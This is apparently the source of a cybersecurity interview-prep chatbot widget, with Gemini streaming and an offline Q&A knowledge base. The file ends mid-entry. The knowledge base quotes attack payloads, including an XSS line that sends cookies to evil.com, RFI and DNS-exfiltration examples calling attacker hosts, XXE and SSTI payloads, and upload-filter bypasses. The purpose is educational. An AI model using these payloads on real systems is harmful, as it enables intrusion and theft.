// ============================================================
// CyberPrep AI Chatbot — Hybrid (Gemini API + Offline Fallback)
// ============================================================

(function() {
  'use strict';

  // ── State ──
  let chatOpen = false;
  let apiKey = localStorage.getItem('cyberprep_gemini_key') || '';
  let chatHistory = JSON.parse(localStorage.getItem('cyberprep_chat_history') || '[]');
  let isTyping = false;

  // ── Create DOM ──
  function createChatWidget() {
    // Floating button
    const fab = document.createElement('div');
    fab.id = 'chatFab';
    fab.innerHTML = '🤖';
    fab.title = 'Ask CyberBot';

    // Chat window
    const win = document.createElement('div');
    win.id = 'chatWindow';
    win.innerHTML = `
      <div class="chat-header">
        <div class="chat-header-left">
          <span class="chat-avatar">🤖</span>
          <div>
            <div class="chat-title">CyberBot</div>
            <div class="chat-subtitle">Your AI Security Mentor</div>
          </div>
        </div>
        <div class="chat-header-right">
          <button class="chat-settings-btn" id="chatSettingsBtn" title="API Settings">⚙️</button>
          <button class="chat-clear-btn" id="chatClearBtn" title="Clear Chat">🗑️</button>
          <button class="chat-close-btn" id="chatCloseBtn">✕</button>
        </div>
      </div>
      <div class="chat-settings-panel" id="chatSettingsPanel" style="display:none">
        <div class="settings-inner">
          <label>Gemini API Key <span class="settings-hint">(Free at <a href="https://aistudio.google.com/apikey" target="_blank">aistudio.google.com</a>)</span></label>
          <div class="settings-input-row">
            <input type="password" id="apiKeyInput" placeholder="Paste your API key..." value="${apiKey}" />
            <button id="saveKeyBtn" class="btn-save-key">Save</button>
          </div>
          <div class="settings-status" id="keyStatus">${apiKey ? '✅ Key saved — AI mode active' : '⚠️ No key — using offline mode'}</div>
        </div>
      </div>
      <div class="chat-messages" id="chatMessages"></div>
      <div class="chat-input-area">
        <textarea id="chatInput" placeholder="Ask me anything about cybersecurity..." rows="1"></textarea>
        <button id="chatSendBtn" class="chat-send-btn">▶</button>
      </div>
    `;

    document.body.appendChild(fab);
    document.body.appendChild(win);

    // ── Event Listeners ──
    fab.addEventListener('click', toggleChat);
    document.getElementById('chatCloseBtn').addEventListener('click', toggleChat);
    document.getElementById('chatSendBtn').addEventListener('click', sendMessage);
    document.getElementById('chatClearBtn').addEventListener('click', clearChat);
    document.getElementById('chatSettingsBtn').addEventListener('click', toggleSettings);
    document.getElementById('saveKeyBtn').addEventListener('click', saveApiKey);

    const input = document.getElementById('chatInput');
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' && !e.shiftKey) {
        e.preventDefault();
        sendMessage();
      }
    });
    // Auto-resize textarea
    input.addEventListener('input', () => {
      input.style.height = 'auto';
      input.style.height = Math.min(input.scrollHeight, 120) + 'px';
    });

    // Load history
    renderHistory();

    // Welcome message if empty
    if (chatHistory.length === 0) {
      addBotMessage(getWelcomeMessage(), false);
    }
  }

  function getWelcomeMessage() {
    return `👋 **Hey! I'm CyberBot**, your AI security interview prep buddy!

I can help you with:
• 🔐 **Cybersecurity concepts** — XSS, SQLi, CSRF, SSRF, etc.
• 🛡️ **OWASP Top 10** — What each vuln means & how to fix it
• 🌐 **Networking** — OSI, TCP/IP, DNS, ports, protocols
• 🐧 **Linux commands** — Terminal essentials for security
• 🎯 **Interview questions** — Practice Q&A for Kratikal
• 📋 **Scenario walkthroughs** — "How would you test X?"

${apiKey ? '✅ **AI Mode Active** — I\'ll give you detailed, intelligent answers!' : '⚙️ **Tip:** Add your free Gemini API key in settings for smarter AI-powered answers!'}

**Try asking:** "What is SQL injection and how to prevent it?"`;
  }

  // ── Toggle functions ──
  function toggleChat() {
    chatOpen = !chatOpen;
    document.getElementById('chatWindow').classList.toggle('open', chatOpen);
    document.getElementById('chatFab').classList.toggle('hidden', chatOpen);
    if (chatOpen) {
      setTimeout(() => document.getElementById('chatInput').focus(), 300);
    }
  }

  function toggleSettings() {
    const panel = document.getElementById('chatSettingsPanel');
    panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
  }

  function saveApiKey() {
    const input = document.getElementById('apiKeyInput');
    apiKey = input.value.trim();
    localStorage.setItem('cyberprep_gemini_key', apiKey);
    const status = document.getElementById('keyStatus');
    if (apiKey) {
      status.innerHTML = '✅ Key saved — AI mode active!';
      status.style.color = '#0f0';
    } else {
      status.innerHTML = '⚠️ No key — using offline mode';
      status.style.color = '#f80';
    }
    setTimeout(() => toggleSettings(), 1000);
  }

  function clearChat() {
    if (!confirm('Clear all chat history?')) return;
    chatHistory = [];
    localStorage.removeItem('cyberprep_chat_history');
    document.getElementById('chatMessages').innerHTML = '';
    addBotMessage(getWelcomeMessage(), false);
  }

  // ── Message Functions ──
  function addUserMessage(text) {
    chatHistory.push({ role: 'user', text, ts: Date.now() });
    saveChatHistory();
    appendMessageDOM('user', text);
  }

  function addBotMessage(text, save = true) {
    if (save) {
      chatHistory.push({ role: 'bot', text, ts: Date.now() });
      saveChatHistory();
    }
    appendMessageDOM('bot', text);
  }

  function appendMessageDOM(role, text) {
    const container = document.getElementById('chatMessages');
    const msgDiv = document.createElement('div');
    msgDiv.className = `chat-msg chat-msg-${role}`;
    
    const bubble = document.createElement('div');
    bubble.className = `chat-bubble chat-bubble-${role}`;
    bubble.innerHTML = formatMarkdown(text);
    
    msgDiv.appendChild(bubble);
    container.appendChild(msgDiv);
    container.scrollTop = container.scrollHeight;
    return bubble;
  }

  function showTyping() {
    const container = document.getElementById('chatMessages');
    const typing = document.createElement('div');
    typing.className = 'chat-msg chat-msg-bot';
    typing.id = 'typingIndicator';
    typing.innerHTML = `<div class="chat-bubble chat-bubble-bot typing-bubble">
      <span class="dot"></span><span class="dot"></span><span class="dot"></span>
    </div>`;
    container.appendChild(typing);
    container.scrollTop = container.scrollHeight;
  }

  function hideTyping() {
    const el = document.getElementById('typingIndicator');
    if (el) el.remove();
  }

  function renderHistory() {
    const container = document.getElementById('chatMessages');
    container.innerHTML = '';
    chatHistory.forEach(msg => {
      appendMessageDOM(msg.role === 'user' ? 'user' : 'bot', msg.text);
    });
  }

  function saveChatHistory() {
    // Keep last 100 messages
    if (chatHistory.length > 100) chatHistory = chatHistory.slice(-100);
    localStorage.setItem('cyberprep_chat_history', JSON.stringify(chatHistory));
  }

  // ── Send Message ──
  async function sendMessage() {
    const input = document.getElementById('chatInput');
    const text = input.value.trim();
    if (!text || isTyping) return;

    addUserMessage(text);
    input.value = '';
    input.style.height = 'auto';
    isTyping = true;
    showTyping();

    try {
      if (apiKey) {
        let bubble = null;
        let fullText = '';
        
        await streamGeminiResponse(text, (updatedText) => {
          if (!bubble) {
            hideTyping();
            bubble = appendMessageDOM('bot', '');
          }
          const container = document.getElementById('chatMessages');
          // Check if user is near bottom BEFORE rendering new content
          const isNearBottom = (container.scrollHeight - container.scrollTop - container.clientHeight) < 80;

          fullText = updatedText;
          bubble.innerHTML = formatMarkdown(fullText);

          // Only auto-scroll if user has NOT scrolled up to read
          if (isNearBottom) {
            container.scrollTop = container.scrollHeight;
          }
        });

        hideTyping();

        if (fullText.trim()) {
          chatHistory.push({ role: 'bot', text: fullText, ts: Date.now() });
          saveChatHistory();
        } else {
          throw new Error('Empty response received from AI');
        }
      } else {
        const response = getOfflineResponse(text);
        hideTyping();
        addBotMessage(response);
      }
    } catch (err) {
      hideTyping();
      console.error('Chatbot error:', err);
      if (apiKey) {
        addBotMessage(`⚠️ _AI temporarily slow (${err.message || 'connection issue'}). Showing offline answer:_ \n\n` + getOfflineResponse(text));
      } else {
        const fallback = getOfflineResponse(text);
        addBotMessage(fallback);
      }
    }
    isTyping = false;
  }

  // ── Gemini API (Real-Time SSE Streaming) ──
  async function streamGeminiResponse(userMessage, onChunk) {
    const systemPrompt = `You are CyberBot, a friendly, sharp senior cybersecurity mentor / bhaiya helping the user crack their upcoming Kratikal Tech VAPT / Application Security internship interview.

Personality & Tone:
- Talk like a genuine, supportive mentor / elder bro — natural, encouraging, and human.
- Use casual, relatable Hinglish naturally (e.g., "Bhai dekho...", "Simple shabdo me samjho...", "Basically scene ye hai...", "Tension mat le, bilkul simple hai...").
- Use vivid real-world analogies (hotel rooms, fake signatures, restaurants, gatekeepers, parcel delivery, apartment keys) so concepts stick instantly.
- STRICT RULE: NEVER output raw markdown hashes like "#####", "####", or "###". Use clean bold points and bullet points (•) instead.
- Break answers into punchy, easy-to-read sections:
  • Desi Analogy (Real-world example)
  • Tech Concept (Simple shabdo me kya hota hai)
  • Attack & Defense (Burp Suite me kaise check karte hain aur fix kaise hota hai)
  • 🎯 Interviewer ko kya bolna hai (Give 2-3 crisp, confident English sentences they can directly say in the interview).
- Always focus on practical VAPT knowledge (Burp Suite, OWASP Top 10, manual testing, business logic flaws).`;

    // Build conversation context (last 10 messages for context)
    const recentHistory = chatHistory.slice(-10);
    const contents = [];
    
    // Filter and build contents — must start with 'user' role for Gemini API
    let foundFirstUser = false;
    recentHistory.forEach(msg => {
      const role = msg.role === 'user' ? 'user' : 'model';
      if (!foundFirstUser && role === 'model') return;
      foundFirstUser = true;
      
      const lastContent = contents[contents.length - 1];
      if (lastContent && lastContent.role === role) {
        lastContent.parts[0].text += '\n' + msg.text;
      } else {
        contents.push({
          role: role,
          parts: [{ text: msg.text }]
        });
      }
    });

    // Ensure we have at least the current user message
    if (contents.length === 0) {
      contents.push({
        role: 'user',
        parts: [{ text: userMessage }]
      });
    }

    const FAST_MODELS = [
      'gemini-3.5-flash-lite',
      'gemini-3.5-flash',
      'gemini-3.6-flash'
    ];

    let lastError = null;

    for (const model of FAST_MODELS) {
      try {
        const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/${model}:streamGenerateContent?alt=sse&key=${apiKey}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            system_instruction: {
              parts: [{ text: systemPrompt }]
            },
            contents: contents,
            generationConfig: {
              temperature: 0.6,
              maxOutputTokens: 4000
            }
          })
        });

        if (!response.ok) {
          const err = await response.json().catch(() => ({}));
          if (response.status === 401 || response.status === 403) {
            throw new Error('Invalid API key. Please check your key in settings.');
          }
          throw new Error(err.error?.message || `HTTP ${response.status}`);
        }

        const reader = response.body.getReader();
        const decoder = new TextDecoder();
        let fullText = '';
        let buffer = '';

        while (true) {
          const { done, value } = await reader.read();
          if (done) break;
          buffer += decoder.decode(value, { stream: true });
          const lines = buffer.split('\n');
          buffer = lines.pop(); // keep partial trailing line

          for (const line of lines) {
            const trimmed = line.trim();
            if (trimmed.startsWith('data: ')) {
              const jsonStr = trimmed.slice(6).trim();
              if (!jsonStr) continue;
              try {
                const data = JSON.parse(jsonStr);
                const chunk = data.candidates?.[0]?.content?.parts?.[0]?.text;
                if (chunk) {
                  fullText += chunk;
                  onChunk(fullText);
                }
              } catch (e) {
                // Ignore partial JSON chunks
              }
            }
          }
        }

        if (fullText.trim()) {
          return fullText;
        }
      } catch (err) {
        lastError = err;
        console.warn(`Model ${model} stream error:`, err.message);
        if (err.message && err.message.includes('Invalid API key')) {
          throw err;
        }
      }
    }

    throw lastError || new Error('Stream failed');
  }

  // ── Offline Knowledge Base ──
  function getOfflineResponse(query) {
    const q = query.toLowerCase().trim();

    // Knowledge base — comprehensive cybersecurity Q&A
    const knowledge = [
      // === XSS ===
      {
        keywords: ['xss', 'cross site scripting', 'cross-site scripting', 'script injection'],
        answer: `**Cross-Site Scripting (XSS)** is when an attacker injects malicious scripts into web pages viewed by other users.

**3 Types:**
• **Reflected XSS** — Payload in URL, reflected back immediately (e.g., search results)
• **Stored XSS** — Payload saved in database, executes for every user (e.g., comments)
• **DOM-based XSS** — Payload manipulates DOM directly in browser, never hits server

**Impact:** Cookie theft, session hijacking, defacement, keylogging, phishing

**Example:** \`<script>document.location='http://evil.com?c='+document.cookie</script>\`

**Prevention:**
• Input validation & output encoding
• Content Security Policy (CSP)
• HttpOnly & Secure cookie flags
• Use frameworks that auto-escape (React, Angular)`
      },
      // === SQL Injection ===
      {
        keywords: ['sql injection', 'sqli', 'sql inject', 'database injection'],
        answer: `**SQL Injection (SQLi)** is when an attacker inserts malicious SQL queries through user input to manipulate the database.

**Types:**
• **In-band (Classic)** — Results visible directly (UNION-based, Error-based)
• **Blind SQLi** — No visible output (Boolean-based, Time-based)
• **Out-of-band** — Data exfiltrated through different channel (DNS, HTTP)

**Example:** Login bypass: \`' OR 1=1 --\`
**UNION attack:** \`' UNION SELECT username, password FROM users --\`

**Impact:** Data theft, authentication bypass, data modification, RCE (in severe cases)

**Prevention:**
• **Parameterized queries / Prepared statements** (most effective)
• Input validation & whitelisting
• Stored procedures
• Least privilege database accounts
• WAF as additional layer

**Tools:** SQLmap, Burp Suite, Havij`
      },
      // === CSRF ===
      {
        keywords: ['csrf', 'cross site request forgery', 'cross-site request forgery', 'xsrf'],
        answer: `**Cross-Site Request Forgery (CSRF)** tricks an authenticated user into performing unwanted actions on a trusted site.

**How it works:**
1. User is logged into bank.com
2. User visits evil.com (attacker's site)
3. evil.com has a hidden form that auto-submits a transfer request to bank.com
4. Browser sends cookies automatically → bank thinks it's legitimate

**Impact:** Unauthorized transfers, password changes, email changes

**Prevention:**
• **CSRF tokens** (random, unique per session/request)
• **SameSite cookie attribute** (Lax or Strict)
• **Double submit cookies**
• Verify Origin/Referer headers
• Re-authentication for sensitive actions`
      },
      // === SSRF ===
      {
        keywords: ['ssrf', 'server side request forgery', 'server-side request forgery'],
        answer: `**Server-Side Request Forgery (SSRF)** makes the server send requests to unintended locations.

**Types:**
• **Basic SSRF** — Response returned to attacker
• **Blind SSRF** — No response returned, but side effects occur

**Common targets:**
• \`http://localhost\`, \`http://127.0.0.1\`
• Internal services: \`http://192.168.x.x\`
• Cloud metadata: \`http://169.254.169.254/latest/meta-data/\` (AWS)

**Impact:** Internal network scanning, cloud credential theft, RCE

**Prevention:**
• Whitelist allowed URLs/domains
• Block internal IP ranges
• Don't expose raw responses
• Use DNS resolution validation
• Network segmentation`
      },
      // === XXE ===
      {
        keywords: ['xxe', 'xml external entity', 'xml injection'],
        answer: `**XML External Entity (XXE)** exploits XML parsers that process external entity references.

**Example payload:**
\`\`\`xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
\`\`\`

**Impact:** File reading, SSRF, DoS, port scanning, RCE (rare)

**Prevention:**
• **Disable DTDs and external entities** in XML parser
• Use JSON instead of XML
• Input validation
• Update XML libraries`
      },
      // === IDOR ===
      {
        keywords: ['idor', 'insecure direct object', 'direct object reference', 'horizontal privilege', 'vertical privilege'],
        answer: `**IDOR (Insecure Direct Object Reference)** occurs when an app exposes internal objects (IDs) without proper authorization checks.

**Types:**
• **Horizontal IDOR** — Access another user's data at same privilege level
  → Change \`/api/user/123/profile\` to \`/api/user/124/profile\`
• **Vertical IDOR** — Access higher-privilege functions
  → Change \`role=user\` to \`role=admin\` in request

**Where to find:**
• URL parameters (\`?id=123\`)
• API endpoints (\`/api/orders/456\`)
• Hidden form fields
• Cookies/JWT claims

**Prevention:**
• **Server-side authorization checks** on every request
• Use indirect references (UUIDs instead of sequential IDs)
• Validate user owns the requested resource
• Access control matrices`
      },
      // === LFI / RFI ===
      {
        keywords: ['lfi', 'rfi', 'local file inclusion', 'remote file inclusion', 'file inclusion', 'path traversal', 'directory traversal'],
        answer: `**File Inclusion vulnerabilities** let attackers include files through user input.

**LFI (Local File Inclusion):**
• Include files from the server
• Example: \`?page=../../../../etc/passwd\`
• Can lead to: Source code disclosure, credential theft, RCE (via log poisoning)

**RFI (Remote File Inclusion):**
• Include files from external server
• Example: \`?page=http://evil.com/shell.php\`
• Direct RCE — more critical but rarer (needs \`allow_url_include=On\`)

**Path Traversal bypass techniques:**
• \`../\` and \`..\\\\
• URL encoding: \`%2e%2e%2f\`
• Double encoding: \`%252e%252e%252f\`
• Null byte: \`%00\` (older PHP)

**Prevention:**
• Never use user input in file paths
• Whitelist allowed files
• Chroot/jail the application
• Disable \`allow_url_include\``
      },
      // === DoS ===
      {
        keywords: ['dos', 'ddos', 'denial of service', 'denial-of-service'],
        answer: `**Denial of Service (DoS/DDoS)** makes a service unavailable to legitimate users.

**DoS vs DDoS:**
• **DoS** — Single source attack
• **DDoS** — Distributed from many sources (botnets)

**Types:**
• **Volumetric** — Flood bandwidth (UDP flood, ICMP flood)
• **Protocol** — Exploit protocol weaknesses (SYN flood, Ping of Death)
• **Application Layer** — Target specific services (HTTP flood, Slowloris)

**Application-level DoS:**
• ReDoS (Regex DoS) — Malicious regex patterns
• XML bomb (Billion Laughs)
• Zip bomb
• Resource exhaustion (large file upload, infinite loops)

**Prevention:**
• Rate limiting
• WAF / DDoS protection (Cloudflare, AWS Shield)
• Input validation
• Resource limits
• Load balancers
• CAPTCHA for forms`
      },
      // === Privilege Escalation ===
      {
        keywords: ['privilege escalation', 'privesc', 'priv esc', 'escalation'],
        answer: `**Privilege Escalation** is gaining higher access than authorized.

**Horizontal:** Access other users' data at same level
**Vertical:** Gain admin/root from normal user

**Web Application:**
• Parameter tampering (\`role=admin\`, \`isAdmin=true\`)
• JWT manipulation (change role claim, alg:none attack)
• IDOR to access admin functions
• Forced browsing (\`/admin\`, \`/dashboard\`)

**System Level:**
• **Linux:** SUID binaries, kernel exploits, sudo misconfig, cron jobs, writable /etc/passwd
• **Windows:** Unquoted service paths, DLL hijacking, token impersonation

**Prevention:**
• Server-side role checks on every request
• Principle of least privilege
• Don't trust client-side role data
• Regular access control audits`
      },
      // === Encoding vs Encryption vs Hashing ===
      {
        keywords: ['encoding', 'encryption', 'hashing', 'encode', 'encrypt', 'hash', 'difference between'],
        answer: `**Encoding vs Encryption vs Hashing:**

| Feature | Encoding | Encryption | Hashing |
|---------|----------|------------|---------|
| **Purpose** | Data format conversion | Confidentiality | Integrity verification |
| **Reversible?** | ✅ Yes (easily) | ✅ Yes (with key) | ❌ No (one-way) |
| **Key needed?** | ❌ No | ✅ Yes | ❌ No |
| **Examples** | Base64, URL encoding, HTML encoding | AES, RSA, DES | MD5, SHA-256, bcrypt |
| **Security?** | ❌ Not for security | ✅ Yes | ✅ Yes |

**Key Points:**
• **Encoding** is NOT security — anyone can decode Base64
• **Encryption** needs a key — symmetric (AES) uses same key, asymmetric (RSA) uses public/private pair
• **Hashing** is one-way — used for passwords (bcrypt, argon2), integrity checks
• **Salting** = adding random data before hashing to prevent rainbow table attacks`
      },
      // === Authentication vs Authorization ===
      {
        keywords: ['authentication', 'authorization', 'authn', 'authz', 'auth difference'],
        answer: `**Authentication vs Authorization:**

| Aspect | Authentication (AuthN) | Authorization (AuthZ) |
|--------|----------------------|---------------------|
| **Question** | "WHO are you?" | "WHAT can you do?" |
| **Verifies** | Identity | Permissions |
| **Example** | Login with username/password | Admin can delete, user can only read |
| **Comes** | First | After authentication |
| **Methods** | Passwords, OTP, biometrics, tokens | RBAC, ACLs, policies |

**Interview Answer:** "Authentication verifies who the user is (login), while authorization determines what they're allowed to do (permissions). Authentication always comes first — you must prove who you are before the system checks what you can access."`
      },
      // === OWASP Top 10 ===
      {
        keywords: ['owasp', 'owasp top 10', 'top 10', 'top ten'],
        answer: `**OWASP Top 10 (2021):**

1. **A01: Broken Access Control** — IDOR, privilege escalation, forced browsing
2. **A02: Cryptographic Failures** — Weak encryption, plaintext storage
3. **A03: Injection** — SQLi, XSS, command injection, LDAP injection
4. **A04: Insecure Design** — Flawed architecture, missing threat modeling
5. **A05: Security Misconfiguration** — Default creds, unnecessary features, verbose errors
6. **A06: Vulnerable Components** — Outdated libraries with known CVEs
7. **A07: Auth Failures** — Weak passwords, credential stuffing, session issues
8. **A08: Software & Data Integrity Failures** — Insecure CI/CD, unsigned updates
9. **A09: Logging & Monitoring Failures** — No audit trails, delayed detection
10. **A10: SSRF** — Server making requests to internal resources

💡 **#1 changed from Injection to Broken Access Control in 2021!**`
      },
      // === OSI Model ===
      {
        keywords: ['osi', 'osi model', 'layers', '7 layers', 'network layers'],
        answer: `**OSI Model — 7 Layers** (Remember: **P**lease **D**o **N**ot **T**hrow **S**ausage **P**izza **A**way)

| Layer | Name | Protocol/Example | Function |
|-------|------|-------------------|----------|
| 7 | **Application** | HTTP, FTP, DNS, SMTP | User interface |
| 6 | **Presentation** | SSL/TLS, JPEG, ASCII | Encryption, formatting |
| 5 | **Session** | NetBIOS, RPC | Session management |
| 4 | **Transport** | TCP, UDP | Reliable delivery, ports |
| 3 | **Network** | IP, ICMP, OSPF | Routing, IP addressing |
| 2 | **Data Link** | Ethernet, ARP, MAC | Frame delivery, MAC addr |
| 1 | **Physical** | Cables, Hubs | Bits on wire |

**TCP vs UDP:**
• **TCP** — Connection-oriented, reliable, 3-way handshake (SYN→SYN-ACK→ACK)
• **UDP** — Connectionless, fast, no guaranteed delivery (DNS, streaming, gaming)`
      },
      // === Common Ports ===
      {
        keywords: ['ports', 'common ports', 'port numbers', 'port list'],
        answer: `**Common Ports for Security:**

| Port | Service | Notes |
|------|---------|-------|
| 20/21 | FTP | File Transfer (plaintext!) |
| 22 | SSH | Secure Shell |
| 23 | Telnet | Remote access (plaintext!) |
| 25 | SMTP | Email sending |
| 53 | DNS | Domain resolution |
| 80 | HTTP | Web (unencrypted) |
| 110 | POP3 | Email retrieval |
| 135 | MSRPC | Windows RPC |
| 139/445 | SMB | Windows file sharing |
| 443 | HTTPS | Secure web |
| 1433 | MSSQL | Microsoft SQL Server |
| 3306 | MySQL | MySQL database |
| 3389 | RDP | Remote Desktop |
| 5432 | PostgreSQL | PostgreSQL database |
| 8080 | HTTP Alt | Alternative web/proxy |

💡 Well-known: 0–1023 | Registered: 1024–49151 | Dynamic: 49152–65535`
      },
      // === Burp Suite ===
      {
        keywords: ['burp', 'burp suite', 'burpsuite', 'proxy tool'],
        answer: `**Burp Suite** — The #1 web security testing tool.

**Key Components:**
• **Proxy** — Intercept & modify HTTP/HTTPS traffic
• **Scanner** — Automated vulnerability scanning (Pro only)
• **Repeater** — Manually modify & resend requests
• **Intruder** — Automated attacks (brute force, fuzzing)
• **Decoder** — Encode/decode data (Base64, URL, etc.)
• **Comparer** — Compare responses
• **Sequencer** — Analyze token randomness

**Common workflow:**
1. Set browser proxy → 127.0.0.1:8080
2. Browse target normally (spider)
3. Intercept interesting requests
4. Send to Repeater → test manually
5. Send to Intruder → automate attacks

💡 **Interview tip:** Always mention Burp Suite when asked about VAPT tools!`
      },
      // === Nmap ===
      {
        keywords: ['nmap', 'port scan', 'network scan', 'scanning'],
        answer: `**Nmap** — Network Mapper, essential scanning tool.

**Common scans:**
• \`nmap -sS target\` — SYN scan (stealth, most common)
• \`nmap -sV target\` — Version detection
• \`nmap -O target\` — OS detection
• \`nmap -A target\` — Aggressive (OS + version + scripts + traceroute)
• \`nmap -p- target\` — All 65535 ports
• \`nmap -sU target\` — UDP scan
• \`nmap --script vuln target\` — Vulnerability scripts

**Output options:**
• \`-oN file.txt\` — Normal output
• \`-oX file.xml\` — XML output
• \`-oG file.gnmap\` — Grepable output

**Scan states:** open, closed, filtered, unfiltered, open|filtered`
      },
      // === Linux ===
      {
        keywords: ['linux', 'linux commands', 'terminal', 'command line', 'bash', 'kali'],
        answer: `**Essential Linux Commands for Security:**

**File operations:**
• \`ls -la\` — List all files with permissions
• \`cat /etc/passwd\` — View user accounts
• \`find / -perm -4000\` — Find SUID binaries (privesc!)
• \`grep -r "password" /var/\` — Search for passwords

**Network:**
• \`ifconfig\` / \`ip addr\` — Show IP addresses
• \`netstat -tulnp\` — Show open ports & connections
• \`ss -tulnp\` — Modern netstat alternative
• \`curl -v URL\` — Make HTTP requests with headers

**Permissions:**
• \`chmod 777 file\` — Read/write/execute for all
• Format: \`rwxrwxrwx\` = Owner/Group/Others
• \`r=4, w=2, x=1\` → 755 = rwxr-xr-x

**Security-specific:**
• \`nikto -h target\` — Web vulnerability scanner
• \`dirb URL\` — Directory brute force
• \`hydra -l user -P wordlist.txt target ssh\` — Brute force
• \`john hash.txt\` — Password cracker`
      },
      // === HTTP Methods & Status Codes ===
      {
        keywords: ['http', 'http methods', 'status code', 'get post', 'request method'],
        answer: `**HTTP Methods:**
• **GET** — Retrieve data (parameters in URL)
• **POST** — Submit data (parameters in body)
• **PUT** — Update entire resource
• **PATCH** — Partial update
• **DELETE** — Remove resource
• **OPTIONS** — Check allowed methods (CORS preflight)
• **HEAD** — GET without body

**Status Codes:**
• **1xx** — Informational
• **200** — OK | **201** — Created | **204** — No Content
• **301** — Permanent Redirect | **302** — Temporary Redirect
• **400** — Bad Request | **401** — Unauthorized | **403** — Forbidden
• **404** — Not Found | **405** — Method Not Allowed
• **500** — Internal Server Error | **502** — Bad Gateway | **503** — Service Unavailable

💡 **Security note:** 403 vs 401 — 401 means "not authenticated", 403 means "authenticated but not authorized"`
      },
      // === JWT ===
      {
        keywords: ['jwt', 'json web token', 'token', 'bearer'],
        answer: `**JWT (JSON Web Token)** — Compact token for authentication.

**Structure:** \`header.payload.signature\` (Base64 encoded)

**Header:** \`{"alg": "HS256", "typ": "JWT"}\`
**Payload:** \`{"sub": "123", "name": "user", "role": "admin", "exp": 1234567890}\`
**Signature:** HMAC-SHA256(header + payload, secret)

**Common JWT Attacks:**
• **alg:none** — Remove signature verification
• **Key confusion** — Switch RS256 → HS256, sign with public key
• **Brute force secret** — If weak secret, crack with hashcat/john
• **Claim tampering** — Modify \`role\` from "user" to "admin"
• **Expired token reuse** — If expiry not checked

**Prevention:**
• Always verify signature server-side
• Use strong secrets (256+ bits)
• Validate all claims (exp, iss, aud)
• Blacklist alg:none`
      },
      // === Session Management ===
      {
        keywords: ['session', 'cookie', 'session management', 'session hijacking'],
        answer: `**Session Management Security:**

**Cookie Flags:**
• **HttpOnly** — Prevents JavaScript access (blocks XSS cookie theft)
• **Secure** — Only sent over HTTPS
• **SameSite** — Prevents CSRF (Strict/Lax/None)
• **Path** — Limits cookie scope
• **Expires/Max-Age** — Session timeout

**Attacks:**
• **Session Hijacking** — Steal session ID (via XSS, sniffing)
• **Session Fixation** — Set victim's session ID before login
• **Session Prediction** — Guess weak session IDs

**Prevention:**
• Regenerate session ID after login
• Use long, random session tokens
• Implement proper timeout
• Set all security flags on cookies
• Invalidate sessions on logout (server-side!)`
      },
      // === VAPT Methodology ===
      {
        keywords: ['vapt', 'penetration testing', 'pentest', 'methodology', 'testing approach'],
        answer: `**VAPT Methodology:**

**1. 📋 Planning & Scoping**
• Define scope, rules of engagement, get written authorization

**2. 🔍 Reconnaissance**
• **Passive:** WHOIS, Google dorks, Shodan, social media
• **Active:** Nmap scanning, directory brute forcing

**3. 🎯 Vulnerability Assessment**
• Automated scanning (Burp, Nessus, Nikto)
• Manual testing (OWASP checklist)

**4. 💥 Exploitation**
• Attempt to exploit found vulnerabilities
• Document proof of concept

**5. 📊 Post-Exploitation**
• Assess impact, pivot to other systems
• Data exfiltration tests

**6. 📝 Reporting**
• Executive summary
• Technical findings with severity (CVSS)
• Steps to reproduce
• Remediation recommendations

**Tools:** Nmap, Burp Suite, SQLmap, Nikto, Dirb/Gobuster, Metasploit, Wireshark`
      },
      // === Self XSS ===
      {
        keywords: ['self xss', 'self-xss', 'selfxss'],
        answer: `**Self-XSS** is a social engineering + XSS attack where the victim is tricked into running malicious code in their own browser.

**How it works:**
1. Attacker posts "Paste this code in console to get free premium features!"
2. Victim opens browser DevTools → Console
3. Pastes malicious JavaScript
4. Code steals their session/data

**Why it matters:** Not a traditional vulnerability (requires user action), but still reported in bug bounties when combined with other bugs.

**Impact escalation:** Self-XSS + CSRF = Full XSS (attacker can force the payload)

**Prevention:**
• Facebook-style console warnings
• CSP headers
• User education`
      },
      // === Command Injection ===
      {
        keywords: ['command injection', 'os injection', 'rce', 'remote code execution'],
        answer: `**Command Injection / OS Injection:**

Injecting OS commands through vulnerable application inputs.

**Operators:**
• \`; ls\` — Command separator
• \`| cat /etc/passwd\` — Pipe
• \`&& whoami\` — AND operator
• \`|| id\` — OR operator
• \`\\\`id\\\`\` — Backtick substitution
• \`$(whoami)\` — Command substitution

**Blind Command Injection:**
• Time-based: \`; sleep 10\`
• DNS exfil: \`; nslookup $(whoami).attacker.com\`

**Impact:** Full server compromise, RCE

**Prevention:**
• Never pass user input to system commands
• Input validation (whitelist)
• Use language APIs instead of OS commands
• Run with least privilege`
      },
      // === File Upload ===
      {
        keywords: ['file upload', 'upload vulnerability', 'web shell', 'unrestricted upload'],
        answer: `**File Upload Vulnerabilities:**

**Attack chain:**
1. Upload web shell (e.g., \`cmd.php\`)
2. Access it via URL → Remote Code Execution

**Bypass techniques:**
• **Extension:** \`.php5\`, \`.phtml\`, \`.php.jpg\`, \`.php%00.jpg\`
• **Content-Type:** Change to \`image/jpeg\` in Burp
• **Magic bytes:** Add \`GIF89a\` at start of PHP file
• **Case:** \`.PhP\`, \`.pHp\`
• **Double extension:** \`shell.php.jpg\`
• **Null byte:** \`shell.php%00.jpg\`

**Prevention:**
• Whitelist allowed extensions
• Validate file content (magic bytes)
• Store uploads outside webroot
• Rename uploaded files
• Set non-executable permissions
• Use CDN/separate domain for uploads`
      },
      // === SSTI ===
      {
        keywords: ['ssti', 'server side template injection', 'template injection'],
        answer: `**Server-Side Template Injection (SSTI):**

Injecting template syntax that gets executed on the server.

**Detection:** Input \`{{7*7}}\` → if output is \`49\`, it's vulnerable!

**Common payloads:**
• **Jinja2 (Python):** \`{{config.items()}}\`, \`{{''.__class__.__mro__[1].__subclasses__()}}\`
• **Twig (PHP):** \`{{_self.env.getFilter('system')('id')}}\`
• **Freemarker (Java):** \`<#assign x="freemarker.template.utility.Execute"?new()>\${x("id")}\`

**Impact:** RCE, file read, SSRF

**Prevention:**
• Use logic-less templates (Mustache)
• Sandbox template engine
• Never put user input directly in templates
• Input validation`
      },
      // === Deserialization ===
      {
        keywords: ['deserialization', 'insecure deserialization', 'serialize'],
        answer: `**Insecure Deserialization:**

